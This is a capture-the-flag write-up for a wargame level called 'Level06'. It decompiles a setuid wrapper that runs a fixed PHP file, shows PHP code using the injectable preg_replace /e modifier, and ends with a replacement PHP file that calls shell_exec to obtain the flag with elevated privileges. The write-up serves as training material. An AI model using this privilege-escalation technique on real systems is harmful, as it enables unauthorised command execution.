# Level06 writeup

User level06 has a setuid ELF binary `level06` for the user flag06 and a `level06.php` php file.

`level06.php`
``` php
<?php
	function y($m) { 
		$m = preg_replace("/\./", " x ", $m); 
		$m = preg_replace("/@/", " y", $m); 
		return $m; 
	}
	function x($y, $z) { 
		$a = file_get_contents($y); 
		$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); 
		$a = preg_replace("/\[/", "(", $a); 
		$a = preg_replace("/\]/", ")", $a); 
		return $a; 
	}
	$r = x($argv[1], $argv[2]); 
	print $r;
?>
```

Using a tool like ghidra, we can decompile the `level06` binary and take a look at the c source code.
``` c
int main(undefined4 param_1,int param_2,char **param_3) {
	char **__envp;
	__gid_t __rgid;
	__uid_t __ruid;
	char *php;
	char *phpfile;
	char *argv1;
	char *argv2;
	undefined4 local_24;
	undefined *argc;
	int argv;
  
	__envp = param_3;
	argv = param_2;
	argc = (undefined *)&param_1;
	argv1 = strdup("");
	argv2 = strdup("");
	if (*(int *)(argv + 4) != 0) {
		free(argv1);
		argv1 = strdup(*(char **)(argv + 4));
		if (*(int *)(argv + 8) != 0) {
			free(argv2);
			argv2 = strdup(*(char **)(argv + 8));
		}
	}
	__rgid = getegid();
	__ruid = geteuid();
	setresgid(__rgid,__rgid,__rgid);
	setresuid(__ruid,__ruid,__ruid);
	php = "/usr/bin/php";
	phpfile = "/home/user/level06/level06.php";
	local_24 = 0;
	execve("/usr/bin/php",&php,__envp);
	return 0;
}
```

The vulrability comes in the fact that the `level06` binary executes any file named `level06.php`, so we simply delete/move the original `level06.php` file and make a new file for `level06` to execute.

New `level06.php`
``` php
<?php
	print shell_exec("getflag");
?>
```